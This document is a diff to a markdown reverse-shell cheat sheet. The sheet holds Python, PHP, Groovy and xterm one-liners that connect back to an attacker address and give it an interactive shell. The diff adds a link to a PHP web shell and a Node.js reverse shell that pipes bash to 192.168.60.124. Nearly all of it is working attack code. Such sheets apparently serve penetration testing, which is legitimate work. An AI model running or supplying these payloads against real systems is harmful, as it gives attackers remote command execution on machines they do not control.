@@ -15,6 +15,7 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 ```
 ## PHP
 ---
+My favorite web shell: [p0wny-shell](https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php)
 ```
 php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
 ```
@@ -38,6 +39,22 @@ r = Runtime.getRuntime()
 p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
 p.waitFor()
 ```
+## JavaScript
+---
+```
+var spawn = require('child_process').spawn;
+var net = require('net');
+var reconnect = require('reconnect');
+
+reconnect(function (stream) {
+    var ps = spawn('bash', [ '-i' ]);
+    stream.pipe(ps.stdin);
+    ps.stdout.pipe(stream, { end: false });
+    ps.stderr.pipe(stream, { end: false });
+    ps.on('exit', function () { stream.end() });
+}).connect(5500, '192.168.60.124');
+
+```
 ## xterm
 ---
 One of the simplest forms of reverse shell is an xterm session.  The following command should be run on the server.  It will try to connect back to you (10.0.0.1) on TCP port 6001.
@@ -56,3 +73,4 @@ xhost +targetip
 <br>
 <br>
 Most of these are directly copied from [pentestmonkey](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
+
